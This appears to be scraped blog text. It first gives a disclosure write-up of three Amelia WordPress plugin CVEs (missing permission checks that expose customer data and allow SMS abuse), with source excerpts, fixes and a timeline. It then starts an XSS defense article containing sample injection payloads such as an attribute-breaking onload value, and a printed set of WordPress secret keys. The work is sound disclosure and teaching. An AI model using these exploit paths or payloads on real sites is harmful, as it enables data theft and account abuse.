\\InvalidArgumentException */ public static function wpAmeliaApiCall() &#123; try &#123; /** @var Container $container */ $container = require AMELIA_PATH . '/src/Infrastructure/ContainerConfig/container.php'; $app = new App($container); // Initialize all API routes Routes::routes($app); $app->run(); exit(); &#125; catch (Exception $e) &#123; echo 'ERROR: ' . $e->getMessage(); &#125; &#125; Under src/Infrastructure/Routes, there are many folders and files that handle different routes. For example, user-related routes are in src/Infrastructure/Routes/User/User.php, and the relevant code excerpt is as follows: /** * Class User * * @package AmeliaBooking\\Infrastructure\\Routes\\User */ class User &#123; /** * @param App $app */ public static function routes(App $app) &#123; $app->get('/users/wp-users', GetWPUsersController::class); $app->post('/users/authenticate', LoginCabinetController::class); $app->post('/users/logout', LogoutCabinetController::class); // Customers $app->get('/users/customers/&#123;id:[0-9]+&#125;', GetCustomerController::class); $app->get('/users/customers', GetCustomersController::class); $app->post('/users/customers', AddCustomerController::class); $app->post('/users/customers/&#123;id:[0-9]+&#125;', UpdateCustomerController::class); $app->post('/users/customers/delete/&#123;id:[0-9]+&#125;', DeleteUserController::class); $app->get('/users/customers/effect/&#123;id:[0-9]+&#125;', GetUserDeleteEffectController::class); $app->post('/users/customers/reauthorize', ReauthorizeController::class); // Providers $app->get('/users/providers/&#123;id:[0-9]+&#125;', GetProviderController::class); $app->get('/users/providers', GetProvidersController::class); $app->post('/users/providers', AddProviderController::class); $app->post('/users/providers/&#123;id:[0-9]+&#125;', UpdateProviderController::class); $app->post('/users/providers/status/&#123;id:[0-9]+&#125;', UpdateProviderStatusController::class); $app->post('/users/providers/delete/&#123;id:[0-9]+&#125;', DeleteUserController::class); $app->get('/users/providers/effect/&#123;id:[0-9]+&#125;', GetUserDeleteEffectController::class); // Current User $app->get('/users/current', GetCurrentUserController::class); &#125; &#125; So how do we actually call these routes? In src/Infrastructure/ContainerConfig/request.php, some transformations are made for the query string of the request: &lt;?php use Slim\\Http\\Request; use Slim\\Http\\Uri; $entries['request'] = function (AmeliaBooking\\Infrastructure\\Common\\Container $c) &#123; $curUri = Uri::createFromEnvironment($c->get('environment')); // 附註：AMELIA_ACTION_SLUG = \"action=wpamelia_api&amp;call=\" $newRoute = str_replace( ['XDEBUG_SESSION_START=PHPSTORM&amp;' . AMELIA_ACTION_SLUG, AMELIA_ACTION_SLUG], '', $curUri->getQuery() ); $newPath = strpos($newRoute, '&amp;') ? substr( $newRoute, 0, strpos($newRoute, '&amp;') ) : $newRoute; $newQuery = strpos($newRoute, '&amp;') ? substr( $newRoute, strpos($newRoute, '&amp;') + 1 ) : ''; $request = Request::createFromEnvironment($c->get('environment')) ->withUri( $curUri ->withPath($newPath) ->withQuery($newQuery) ); if (method_exists($request, 'getParam') &amp;&amp; $request->getParam('showAmeliaErrors')) &#123; ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); &#125; return $request; &#125;; Simply put, when your request URL looks like this: /wordpress/wp-admin/admin-ajax.php?action=wpamelia_api&amp;call=/users/wp-users, the query string is action=wpamelia_api&amp;call=/users/wp-users. The part that matches AMELIA_ACTION_SLUG is replaced with a blank space, and it becomes /users/wp-users, which corresponds to the route seen in the file above and is then processed by the Slim PHP framework. /users/wp-users corresponds to GetWPUsersController::class. Let’s take a look at the code for the controller: &lt;?php namespace AmeliaBooking\\Application\\Controller\\User; use AmeliaBooking\\Application\\Commands\\User\\GetWPUsersCommand; use AmeliaBooking\\Application\\Controller\\Controller; use Slim\\Http\\Request; /** * Class GetWPUsersController * * @package AmeliaBooking\\Application\\Controller\\User */ class GetWPUsersController extends Controller &#123; /** * Instantiates the Get WP Users command to hand it over to the Command Handler * * @param Request $request * @param $args * * @return GetWPUsersCommand * @throws \\RuntimeException */ protected function instantiateCommand(Request $request, $args) &#123; $command = new GetWPUsersCommand($args); $command->setField('id', (int)$request->getQueryParam('id')); $command->setField('role', $request->getQueryParam('role')); $requestBody = $request->getParsedBody(); $this->setCommandFields($command, $requestBody); return $command; &#125; &#125; Here, the Command Pattern in design patterns is used to wrap each action into a command. Who handles this command? Each controller inherits AmeliaBooking\\Application\\Controller\\Controller, so the handling code is inside: /** * @param Request $request * @param Response $response * @param $args * * @return Response * @throws \\InvalidArgumentException * @throws \\RuntimeException */ public function __invoke(Request $request, Response $response, $args) &#123; /** @var Command $command */ $command = $this->instantiateCommand($request, $args); if (!wp_verify_nonce($command->getField('ameliaNonce'), 'ajax-nonce') &amp;&amp; ( $command instanceof DeleteUserCommand || $command instanceof DeletePackageCommand || $command instanceof DeleteCategoryCommand || $command instanceof DeleteServiceCommand || $command instanceof DeleteExtraCommand || $command instanceof DeleteLocationCommand || $command instanceof DeleteEventCommand || $command instanceof DeletePaymentCommand || $command instanceof DeleteCouponCommand || $command instanceof DeleteCustomFieldCommand || $command instanceof DeleteAppointmentCommand || $command instanceof DeleteBookingCommand || $command instanceof DeleteEventBookingCommand || $command instanceof DeletePackageCustomerCommand || $command instanceof DeleteNotificationCommand ) ) &#123; return $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); &#125; /** @var CommandResult $commandResult */ $commandResult = $this->commandBus->handle($command); if ($commandResult->getUrl() !== null) &#123; $this->emitSuccessEvent($this->eventBus, $commandResult); /** @var Response $response */ $response = $response->withHeader('Location', $commandResult->getUrl()); $response = $response->withStatus(self::STATUS_REDIRECT); return $response; &#125; if ($commandResult->hasAttachment() === false) &#123; $responseBody = [ 'message' => $commandResult->getMessage(), 'data' => $commandResult->getData() ]; $this->emitSuccessEvent($this->eventBus, $commandResult); switch ($commandResult->getResult()) &#123; case (CommandResult::RESULT_SUCCESS): $response = $response->withStatus(self::STATUS_OK); break; case (CommandResult::RESULT_CONFLICT): $response = $response->withStatus(self::STATUS_CONFLICT); break; default: $response = $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); break; &#125; /** @var Response $response */ $response = $response->withHeader('Content-Type', 'application/json;charset=utf-8'); $response = $response->write( json_encode( $commandResult->hasDataInResponse() ? $responseBody : array_merge($responseBody, ['data' => []]) ) ); &#125; return $response; &#125; Here, after instantiating a command, it is passed to the commandBus for processing: $this-&gt;commandBus-&gt;handle($command). The code is in src/Infrastructure/ContainerConfig/command.bus.php, excerpted below: &lt;?php defined('ABSPATH') or die('No script kiddies please!'); // @codingStandardsIgnoreStart $entries['command.bus'] = function ($c) &#123; $commands = [ // User User\\DeleteUserCommand::class => new User\\DeleteUserCommandHandler($c), User\\GetCurrentUserCommand::class => new User\\GetCurrentUserCommandHandler($c), User\\GetUserDeleteEffectCommand::class => new User\\GetUserDeleteEffectCommandHandler($c), User\\GetWPUsersCommand::class => new User\\GetWPUsersCommandHandler($c), // more commands... ]; return League\\Tactician\\Setup\\QuickStart::create($commands); &#125;; // @codingStandardsIgnoreEnd From this, we can see that our GetWPUsersCommand will be handled by User\\GetWPUsersCommandHandler, so the main logic is inside: class GetWPUsersCommandHandler extends CommandHandler &#123; /** * @param GetWPUsersCommand $command * * @return CommandResult * @throws AccessDeniedException * @throws InvalidArgumentException * @throws \\AmeliaBooking\\Infrastructure\\Common\\Exceptions\\QueryExecutionException * @throws \\Interop\\Container\\Exception\\ContainerException */ public function handle(GetWPUsersCommand $command) &#123; if (!$this->getContainer()->getPermissionsService()->currentUserCanRead(Entities::EMPLOYEES)) &#123; throw new AccessDeniedException('You are not allowed to read employees.'); &#125; if (!$this->getContainer()->getPermissionsService()->currentUserCanRead(Entities::CUSTOMERS)) &#123; throw new AccessDeniedException('You are not allowed to read customers.'); &#125; $result = new CommandResult(); $this->checkMandatoryFields($command); /** @var UserService $userService */ $userService = $this->container->get('users.service'); $adminIds = $userService->getWpUserIdsByRoles(['administrator']); /** @var WPUserRepository $wpUserRepository */ $wpUserRepository = $this->getContainer()->get('domain.wpUsers.repository'); $result->setResult(CommandResult::RESULT_SUCCESS); $result->setMessage('Successfully retrieved users.'); $result->setData([ Entities::USER . 's' => $wpUserRepository->getAllNonRelatedWPUsers($command->getFields(), $adminIds) ]); return $result; &#125; &#125; We can see that the business logic is inside the handle function. First, the permissions are checked, then the relevant data is fetched through userService, and then $result-&gt;setData is used to set the data to be returned. Finally, the result is returned and handed over to other infra-related code for processing. In addition, in the controller, we can see the permission check related to the command: if (!wp_verify_nonce($command->getField('ameliaNonce'), 'ajax-nonce') &amp;&amp; ( $command instanceof DeleteUserCommand || $command instanceof DeletePackageCommand || $command instanceof DeleteCategoryCommand || $command instanceof DeleteServiceCommand || $command instanceof DeleteExtraCommand || $command instanceof DeleteLocationCommand || $command instanceof DeleteEventCommand || $command instanceof DeletePaymentCommand || $command instanceof DeleteCouponCommand || $command instanceof DeleteCustomFieldCommand || $command instanceof DeleteAppointmentCommand || $command instanceof DeleteBookingCommand || $command instanceof DeleteEventBookingCommand || $command instanceof DeletePackageCustomerCommand || $command instanceof DeleteNotificationCommand ) ) &#123; return $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); &#125; If it is one of these delete commands, it needs to pass the check of wp_verify_nonce. What is this? wp_verify_nonce is a function provided by WordPress for security checks, corresponding to the function wp_create_nonce. In the WordPress backend management page, there is a line of code like this: var wpAmeliaNonce = &#39;&lt;?php echo wp_create_nonce(&#39;ajax-nonce&#39;); ?&gt;&#39;;, which generates a nonce named ajax-nonce. This nonce is actually the result of hashing some strings. If you don’t have the salt used for hashing, it’s basically impossible to forge a nonce, because the salt is usually very long and randomly generated at installation: define('AUTH_KEY', ' Xakm&lt;o xQy rw4EMsLKM-?!T+,PFF&#125;)H4lzcW57AF0U@N@&lt; >M%G4Yt>f`z]MON'); define('SECURE_AUTH_KEY', 'LzJ&#125;op]mr|6+![P&#125;Ak:uNdJCJZd>(Hx.-Mh#Tz)pCIU#uGEnfFz|f ;;eU%/U^O~'); define('LOGGED_IN_KEY', '|i|Ux`9&lt;p-h$aFf(qnT:sDO:D1P^wZ$$/Ra@miTJi9G;ddp_&lt;q&#125;6H1)o|a +&amp;JCM'); define('NONCE_KEY', '%:R&#123;[P|,s.KuMltH5&#125;cI;/k&lt;Gx~j!f0I)m_sIyu+&amp;NJZ)-iO>z7X>QYR0Z_XnZ@|'); define('AUTH_SALT', 'eZyT)-Naw]F8CwA*VaW#q*|.)g@o&#125;||wf~@C-YSt&#125;(dh_r6EbI#A,y|nU2&#123;B#JBW'); define('SECURE_AUTH_SALT', '!=oLUTXh,QW=H `&#125;`L|9/^4-3 STz&#125;,T(w&#125;W&lt;I`.JjPi)&lt;Bmf1v,HpGe&#125;T1:Xt7n'); define('LOGGED_IN_SALT', '+XSqHc;@Q*K_b|Z?NC[3H!!EONbh.n&lt;+=uKR:>*c(u`g~EJBf#8u#R&#123;mUEZrozmm'); define('NONCE_SALT', 'h`GXHhD>SLWVfg1(1(N&#123;;.V!MoE(SfbA_ksP@&amp;`+AycHcAV$+?@3q+rxV&#123;%^VyKT'); Therefore, through wp_verify_nonce, we can ensure that only logged-in users can use certain functions, because if you are not logged in, you cannot get the nonce. The above is the basic structure and processing flow of Amelia, which is the most beautiful one I have seen among several plugins. Everything is organized very well, and the structure is cut well. There won’t be a bunch of miscellaneous code, and it’s easy to find things. Just go to the routes to see the URL and the corresponding controller, and then follow the line to find the command and command handler. Next, let’s talk about the three vulnerabilities mentioned at the beginning. CVE-2022-0720: Amelia &lt; 1.0.47 - Customer+ Arbitrary Appointments Update and Sensitive Data DisclosureThere are two modules related to managing bookings, one called Appointment and the other called Booking. They have a one-to-many relationship, where one Appointment can correspond to multiple Bookings. The relevant routes are as follows: src/Infrastructure/Routes/Booking/Appointment/Appointment.php class Appointment &#123; /** * @param App $app * * @throws \\InvalidArgumentException */ public static function routes(App $app) &#123; $app->get('/appointments', GetAppointmentsController::class); $app->get('/appointments/&#123;id:[0-9]+&#125;', GetAppointmentController::class); $app->post('/appointments', AddAppointmentController::class); $app->post('/appointments/delete/&#123;id:[0-9]+&#125;', DeleteAppointmentController::class); $app->post('/appointments/&#123;id:[0-9]+&#125;', UpdateAppointmentController::class); $app->post('/appointments/status/&#123;id:[0-9]+&#125;', UpdateAppointmentStatusController::class); $app->post('/appointments/time/&#123;id:[0-9]+&#125;', UpdateAppointmentTimeController::class); &#125; &#125; Let’s take the route /appointments/&#123;id:[0-9]+&#125; for displaying the appointment as an example. It corresponds to GetAppointmentController, which calls GetAppointmentCommandHandler in the controller. The code inside is as follows: $customerAS->removeBookingsForOtherCustomers($user, new Collection([$appointment])); Before returning the data, all bookings that do not belong to the user are filtered out, so other people’s data cannot be seen, and permission management is well done. The route for updating the appointment corresponds to UpdateAppointmentController, which in turn corresponds to UpdateAppointmentCommandHandler.php. Some of the code is as follows: try &#123; /** @var AbstractUser $user */ $user = $userAS->authorization( $command->getPage() === 'cabinet' ? $command->getToken() : null, $command->getCabinetType() ); &#125; catch (AuthorizationException $e) &#123; $result->setResult(CommandResult::RESULT_ERROR); $result->setData( [ 'reauthorize' => true ] ); return $result; &#125; if ($userAS->isProvider($user) &amp;&amp; !$settingsDS->getSetting('roles', 'allowWriteAppointments')) &#123; throw new AccessDeniedException('You are not allowed to update appointment'); &#125; // update appointment Two things are checked at the beginning. The first is whether the user is logged in, so even if there is no nonce, this route can still be accessed, but it will be blocked here. The second is the user’s identity. If it is a provider, permission is checked. In Amelia, there are basically several roles: customer, provider, and administrator. So as long as we are not a provider, we can pass this check. It was mentioned earlier that by simply booking a service through Amelia’s plugin, a customer account can be registered in the WordPress system, which can log in to WordPress to manage their previous appointments. Therefore, there is a vulnerability in the permission check here. A user with a customer identity can pass this check and tamper with other people’s appointments. Although it looks ordinary, when the user modifies their own appointment on the front end, they use another /bookings/&#123;id&#125; API. I guess this appointment API is default for providers, so it did not consider the situation of customers. What else can be done besides modifying bookings? Let’s take a look at the updated response: We can see that there is an info field in the response, which contains the personal information of the original customer, including name and phone number, etc. This field is stored when processBooking in src/Application/Services/Reservation/AbstractReservationService.php is called: $appointmentData['bookings'][0]['info'] = json_encode( [ 'firstName' => $appointmentData['bookings'][0]['customer']['firstName'], 'lastName' => $appointmentData['bookings'][0]['customer']['lastName'], 'phone' => $appointmentData['bookings'][0]['customer']['phone'], 'locale' => $appointmentData['locale'], 'timeZone' => $appointmentData['timeZone'], 'urlParams' => !empty($appointmentData['urlParams']) ? $appointmentData['urlParams'] : null, ] ); To sum up, because the permission check was not done well, customers can update other people’s appointments and see the personal information of customers. And the appointment ID is a serial number, so by simply enumerating it, all personal information of everyone in the system can be retrieved. FixIn version 1.0.47, two changes were made. The first is to add permission check for customers for the issue I reported: if ($userAS->isCustomer($user)) &#123; throw new AccessDeniedException('You are not allowed to update appointment'); &#125; The second change is the permission check of routes, which has changed from negative list to positive list. Only a few specific commands do not require login: public function validateNonce($request) &#123; if ($request->getMethod() === 'POST' &amp;&amp; !self::getToken() &amp;&amp; !($this instanceof LoginCabinetCommand) &amp;&amp; !($this instanceof AddBookingCommand) &amp;&amp; !($this instanceof AddStatsCommand) &amp;&amp; !($this instanceof MolliePaymentCommand) &amp;&amp; !($this instanceof MolliePaymentNotifyCommand) &amp;&amp; !($this instanceof PayPalPaymentCommand) &amp;&amp; !($this instanceof PayPalPaymentCallbackCommand) &amp;&amp; !($this instanceof RazorpayPaymentCommand) &amp;&amp; !($this instanceof WooCommercePaymentCommand) &amp;&amp; !($this instanceof SuccessfulBookingCommand) ) &#123; return wp_verify_nonce($request->getQueryParams()['ameliaNonce'], 'ajax-nonce'); &#125; return true; &#125; CVE-2022-0825: Amelia &lt; 1.0.49 - Customer+ Arbitrary Appointments Status UpdateThis vulnerability is similar to the previous one, both of which are related to permission management. The route for this vulnerability is $app-&gt;post(&#39;/appointments/status/&#123;id:[0-9]+&#125;&#39;, UpdateAppointmentStatusController::class);, and the corresponding code is in src/Application/Commands/Booking/Appointment/UpdateAppointmentStatusCommandHandler.php. Permission check is done at the beginning: if (!$this->getContainer()->getPermissionsService()->currentUserCanWriteStatus(Entities::APPOINTMENTS)) &#123; throw new AccessDeniedException('You are not allowed to update appointment status'); &#125; // update appointment Let’s continue to see how currentUserCanWriteStatus is implemented: public function currentUserCanWriteStatus($object) &#123; return $this->userCan($this->currentUser, $object, self::WRITE_STATUS_PERMISSIONS); &#125; Scrolling down, we can find userCan: public function userCan($user, $object, $permission) &#123; if ($user instanceof Admin) &#123; return true; &#125; return $this->permissionsChecker->checkPermissions($user, $object, $permission); &#125; Going one level deeper, we can see the implementation of checkPermissions in src/Infrastructure/WP/PermissionsService/PermissionsChecker.php: public function checkPermissions($user, $object, $permission) &#123; // Admin can do all if ($user instanceof Admin) &#123; return true; &#125; // Get the WP role name of the user, rollback to customer by default $wpRoleName = $user !== null ? 'wpamelia-' . $user->getType() : 'wpamelia-customer'; // Get the wp name of capability we are looking for. $wpCapability = \"amelia_&#123;$permission&#125;_&#123;$object&#125;\"; if ($user !== null &amp;&amp; $user->getExternalId() !== null) &#123; return user_can($user->getExternalId()->getValue(), $wpCapability); &#125; // If user is guest check does it have capability $wpRole = get_role($wpRoleName); return $wpRole !== null &amp;&amp; isset($wpRole->capabilities[$wpCapability]) ? (bool)$wpRole->capabilities[$wpCapability] : false; &#125; One thing to note here is that if the user is null, they will be treated as a customer. The actual permission check is done in the capabilities table in src/Infrastructure/WP/config/Roles.php: // Customer [ 'name' => 'wpamelia-customer', 'label' => __('Amelia Customer', 'amelia'), 'capabilities' => [ 'read' => true, 'amelia_read_menu' => true, 'amelia_read_calendar' => true, 'amelia_read_appointments' => true, 'amelia_read_events' => true, 'amelia_write_status_appointments' => true, 'amelia_write_time_appointments' => true, ] ], Where amelia_write_status_appointments is true, indicating that the customer has permission to update the status. The rest of the process is the same as the previous vulnerability. After updating the appointment, the data is returned as a whole, and the consumer’s personal information can be seen through the info field. Additionally, this vulnerability was pre-auth before version 1.0.47 because the permission check for routes had not yet been positively listed, so even without logging in, this command could be accessed. Furthermore, if the user is null, they are assumed to be a customer by default, completing the entire attack chain: FixIn version 1.0.49, the amelia_write_status_appointments permission for customers was removed. CVE-2022-0837: Amelia &lt; 1.0.48 - Customer+ SMS Service Abuse and Sensitive Data DisclosureLet’s look at the last vulnerability related to permission checks. The problematic route is $app-&gt;post(&#39;/notifications/sms&#39;, SendAmeliaSmsApiRequestController::class);, which corresponds to SendAmeliaSmsApiRequestCommandHandler: public function handle(SendAmeliaSmsApiRequestCommand $command) &#123; $result = new CommandResult(); /** @var SMSAPIServiceInterface $smsApiService */ $smsApiService = $this->getContainer()->get('application.smsApi.service'); // Call method dynamically and pass data to the function. Method name is the request field. $apiResponse = $smsApiService->&#123;$command->getField('action')&#125;($command->getField('data')); $result->setResult(CommandResult::RESULT_SUCCESS); $result->setMessage('Amelia SMS API request successful'); $result->setData($apiResponse); return $result; &#125; As we can see, there is no permission check here, and we can control the parameters passed to this endpoint: $apiResponse = $smsApiService->&#123;$command->getField('action')&#125;($command->getField('data')); There are several methods in smsApiService, and among them, getUserInfo, which can obtain the administrator’s personal information, getPaymentHistory, which can obtain payment records, and testNotification, which can send test SMS messages, all have only one parameter: public function getUserInfo() &#123; $route = 'auth/info'; return $this->sendRequest($route, true); &#125; public function getPaymentHistory($data) &#123; $route = '/payment/history'; return $this->sendRequest($route, true, $data); &#125; public function testNotification($data) &#123; $route = '/sms/send'; /** @var SettingsService $settingsService */ $settingsService = $this->container->get('domain.settings.service'); /** @var EmailNotificationService $notificationService */ $notificationService = $this->container->get('application.emailNotification.service'); /** @var PlaceholderService $placeholderService */ $placeholderService = $this->container->get(\"application.placeholder.&#123;$data['type']&#125;.service\"); $appointmentsSettings = $settingsService->getCategorySettings('appointments'); $notification = $notificationService->getById($data['notificationTemplate']); $dummyData = $placeholderService->getPlaceholdersDummyData('sms'); $isForCustomer = $notification->getSendTo()->getValue() === NotificationSendTo::CUSTOMER; $placeholderStringRec = 'recurring' . 'Placeholders' . ($isForCustomer ? 'Customer' : '') . 'Sms'; $placeholderStringPack = 'package' . 'Placeholders' . ($isForCustomer ? 'Customer' : '') . 'Sms'; $dummyData['recurring_appointments_details'] = $placeholderService->applyPlaceholders($appointmentsSettings[$placeholderStringRec], $dummyData); $dummyData['package_appointments_details'] = $placeholderService->applyPlaceholders($appointmentsSettings[$placeholderStringPack], $dummyData); $body = $placeholderService->applyPlaceholders( $notification->getContent()->getValue(), $dummyData ); $data = [ 'to' => $data['recipientPhone'], 'from' => $settingsService->getSetting('notifications', 'smsAlphaSenderId'), 'body' => $body ]; return $this->sendRequest($route, true, $data); &#125; Actual test screenshots: Sending a test SMS: Sending a test SMS also costs money, and we can burn the administrator’s money by continuously hitting this endpoint. FixIn version 1.0.48, permission checks were added to the controller: if (!$this->getContainer()->getPermissionsService()->currentUserCanWrite(Entities::NOTIFICATIONS)) &#123; throw new AccessDeniedException('You are not allowed to send test email'); &#125; ConclusionAs software development becomes more and more complex, developers often overlook basic permission checks and make incorrect assumptions about permissions. For example, although the appointment-related APIs are for providers, consumers cannot see these APIs on the front end, but the code of WordPress plugins is open, and anyone who reads the code can find all the API paths. When implementing various functions, remember to put permission checks first, and only continue with the process after confirming that the current user has permission to operate on the desired resource. Finally, here is the timeline: 2022-02-20 Reported the appointment update vulnerability through WPScan, retaining CVE-2022-07202022-03-01 Released version 1.0.47, fixing CVE-2022-0720, and some information was made public on WPScan2022-03-02 Reported the appointment status update vulnerability through WPScan, retaining CVE-2022-08252022-03-03 Reported SMS-related vulnerabilities through WPScan, retaining CVE-2022-08372022-03-09 Released version 1.0.48, fixing CVE-2022-0837, and some information was made public on WPScan2022-03-14 Released version 1.0.49, fixing CVE-2022-0825, and some information was made public on WPScan2022-03-26 Vulnerability details were made public on WPScan2022-03-30 Article published","link":"/2022/03/30/en/wordpress-plugin-amelia-sensitive-information-disclosure/"},{"title":"A Brief Discussion on the Various Aspects of XSS Attacks and Defense","text":"IntroductionWhen it comes to XSS (Cross-site scripting), many people may only think of “injecting code into a website”. However, if you think about it carefully, you will find that there are many aspects that can be further explored. These “aspects” can also be understood as different “levels”. For example, the first level is to prevent your website from being attacked by XSS, and not allowing attackers to inject code into the website. The act of “allowing attackers to inject code into the website” can be further divided into different types of injection, such as HTML injection, injection in HTML element attributes, or injection in JavaScript code. Each of these has different attack and defense methods. In addition to preventing code injection, the defender should also think further: “What if code injection does occur?” This is the second level. Although we have done our best to prepare for the first level, vulnerabilities may still occur. Therefore, it is not enough to defend the first level, and we must also defend the second level. Suppose an attacker has found a place to inject code. Can we find a way to prevent it from executing? This is where CSP (Content Security Policy) comes in, by setting some rules to prevent illegal code from executing. For example, inline JavaScript can be prevented from executing, making &lt;img src=x onerror=alert(1)&gt; ineffective. If the attacker is really skilled and can bypass the rules of CSP, then we enter the third level. The assumption of the third level is that the attacker can execute any code on the website. What can we defend against at this point? It is to try to minimize the damage. For example, for platforms like Medium, if an attacker can use XSS to take over someone else’s account, it is a serious vulnerability. Or, because Medium has a paywall feature, if an attacker can transfer money to their account through XSS, it will also be a serious problem. We must try to defend against these attacks under the premise of “the website has already been attacked by XSS”. Next, let’s take a look at the different defense methods for different levels. First Level: Preventing Attackers from Injecting Code into the WebsiteThe first step in preventing XSS is to prevent attackers from injecting what they want into the website. The core spirit can be condensed into one sentence: Never trust user input. Validation should be done wherever there is input. When outputting untrusted data, escaping should be done. For example, if there is a place where users can set their own nickname, special attention should be paid when outputting the data here. If the user’s input is rendered directly without any modification, and the nickname entered by the user is &lt;script&gt;alert(1)&lt;/script&gt;, anyone who browses this page will see an alert pop up because the input is executed as code. This attack can succeed because the user’s input becomes part of the code, causing unexpected behavior. To prevent this behavior, escaping should be done when rendering. For example, &lt; should be converted to &amp;lt, so that what is seen on the screen is still &lt;, but for the parser, it is not the symbol that starts the tag, but the &lt; of the text, which will not be parsed as an HTML tag. In this way, attackers can be prevented from injecting code. However, this is only a superficial understanding of escaping. What really needs to be noted is that different situations may require different ways of escaping, as discussed in these two articles: Re: [Discussion] Why are SQL injection and XSS vulnerabilities so rampant? (1) Re: [Discussion] Why are SQL injection and XSS vulnerabilities so rampant? (2) If you only think of escaping tags and escape &lt;&gt;, then it is indeed impossible to directly insert tags. However, what if the nickname is rendered like this? &lt;img src=\"&lt;?= avatar_url ?>\" alt=\"&lt;?= nickname ?>\" />&lt;div>&lt;?= nickname ?>&lt;/div> In addition to outputting the nickname in the div, the nickname is also rendered in the alt tag of the img. At this time, if you only escape &lt;&gt;, it is not enough, because if I make the nickname &quot; onload=&quot;alert(1), it will become: &lt;img src=\"avatar_url\" alt=\"\" onload=\"alert(1)\" />&lt;div>\" onload=\"alert(1)&lt;/div> Attackers can use &quot; to close the previous attribute and then create a new attribute onload, achieving XSS through HTML tag attribute manipulation. Therefore, common special characters such as &quot;&#39;&lt;&gt; need to be escaped to ensure defense effectiveness in different places. Many programming languages or frameworks have implemented this, such as PHP’s htmlspecialchars: Is that all we need to do? Not yet. Because the content in the link is another matter, for example: &lt;a href=&quot;&lt;?= link ?&gt;&quot;&gt;my website&lt;/a&gt; There is something called JavaScript pseudo-protocol, which can use javascript: to execute JS code, like this: &lt;a href=&quot;javascript:alert(1)&quot;&gt;my website&lt;/a&gt;. When the user clicks on this link, an alert will pop up. And the characters javascript:alert(1) do not contain the special characters &quot;&#39;&lt;&gt;&amp; that we need to escape, so in this case, we need a different escape method or directly check the content and specify that the beginning must be http:// or http://. This is what I just mentioned, different methods are needed to escape and defend in different places. If the same method is used, some places will be ineffective. Some people may say, “Don’t worry! The front-end framework I use has already done it for me, and it will escape by default! It won’t be XSS.” This claim is mostly correct. Nowadays, many front-end frameworks handle this, but pay special attention to the href example I just mentioned, because the characters javascript:alert(1) are not special characters, so they remain the same after escaping, and there are still vulnerabilities. React added a warning for this case in v16.9: Deprecating javascript: URLs, and will automatically block this behavior in later releases. However, according to test results, the current version v17.0.2 only warns and does not block. There are some related discussions: React@16.9 block javascript:void(0); #16592 and False-positive security precaution warning (javascript: URLs) #16382, if you want to see the code, it is here: react&#x2F;packages&#x2F;react-dom&#x2F;src&#x2F;shared&#x2F;sanitizeURL.js . In addition to understanding that escaping in different situations is not an easy task, it is not as simple as imagined to realize which parts are user-input. Because in addition to the database or API being your data source, the URL may also be. Some code directly puts a certain query string on the URL bar into JS, and then outputs this variable directly to the screen. This is unintentionally trusting data that should not be trusted. For example, the search page URL may look like this: https://example.com/search?q=hello, and it is written like this in the program: const q = 'hello' // parameter taken from the URL bar document.querySelector('.search').innerHTML = q At this time, if you replace q with HTML: &lt;script&gt;alert(1)&lt;/script&gt;, if you output it without escaping, an XSS vulnerability will occur. Finally, some websites allow some HTML content, the most common of which is blogs, because blogs need styles, unless it is a custom data format, some websites directly store the content as HTML, and then use DOMPurify or js-xss and other packages to filter out illegal tags or attributes. Although using these libraries is relatively safe, it is important to note that the versions must be updated regularly because these types of packages may also have vulnerabilities (Mutation XSS via namespace confusion – DOMPurify &lt; 2.0.17 bypass). In addition, it is also important to pay attention to the settings when using them, as incorrect settings may also cause problems. For actual cases, please refer to: Prevent XSS Might Be Harder Than You Thought. To summarize, to do a good job of preventing XSS attacks in the first level, the following things need to be considered: Be aware of where users can enter data themselves. Defend against XSS in different contexts. You can also consider introducing a ready-made WAF (Web Application Firewall), which can directly block some suspicious payloads for you. However, WAF is not 100% effective, it is just an additional line of defense. Alternatively, you can also pay attention to this relatively new thing: Trusted Types. Second Level: Preventing Malicious Code from Being ExecutedAssuming that the first level has been breached, attackers can insert arbitrary code on the website. At this point, the focus is on CSP, Content Security Policy. CSP is a series of rules used to tell the browser which sources of resources can be loaded and which cannot. It can be used to specify the CSP rules of a page using response headers or &lt;meta&gt; tags. For example, if I am sure that all the JS on the website comes from the same origin, then my CSP can be written like this: Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; self means same origin. If you try to load JS that is not from the current origin, or execute script directly on the page using inline, you will see a browser error: CSP can specify rules for many different resources. For a more detailed explanation, you can refer to Content Security Policy Reference. If you want to find a more complete CSP, it is fastest to look at the implementation of some large companies. Next, let’s take a look at what GitHub’s CSP looks like (reformatted for readability): default-src &#39;none&#39; base-uri &#39;self&#39;; block-all-mixed-content; connect-src &#39;self&#39; uploads.github.com www.githubstatus.com collector.githubapp.com api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com&#x2F;v1&#x2F;events wss:&#x2F;&#x2F;alive.github.com *.actions.githubusercontent.com wss:&#x2F;&#x2F;*.actions.githubusercontent.com online.visualstudio.com&#x2F;api&#x2F;v1&#x2F;locations insights.github.com; font-src github.githubassets.com; form-action &#39;self&#39; github.com gist.github.com; frame-ancestors &#39;none&#39;; frame-src render.githubusercontent.com; img-src &#39;self&#39; data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com secured-user-images.githubusercontent.com&#x2F; *.githubusercontent.com; manifest-src &#39;self&#39;; media-src github.com user-images.githubusercontent.com&#x2F;; script-src github.githubassets.com; style-src &#39;unsafe-inline&#39; github.githubassets.com; worker-src github.com&#x2F;socket-worker-3f088aa2.js gist.github.com&#x2F;socket-worker-3f088aa2.js To check if there are obvious vulnerabilities in the CSP rules, you can go to CSP Evaluator. GitHub’s CSP is set very strictly, and almost every type of resource is set. Here you can see that the value of script-src is only github.githubassets.com. Because there is no unsafe-inline, inline script cannot be executed, and if you want to import script, you can only import it from the source of github.githubassets.com, which almost blocks the way to execute script. However, the CSP of many websites is not set so strictly, so there is a higher chance of being bypassed, such as A Wormable XSS on HackMD! directly using AngularJS + CSTI on cloudflare CDN to bypass it; HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager uses Google Tag Manager to bypass it. In addition, in some situations, even if it seems to be blocked, it can still be bypassed through existing scripts. For more information, please 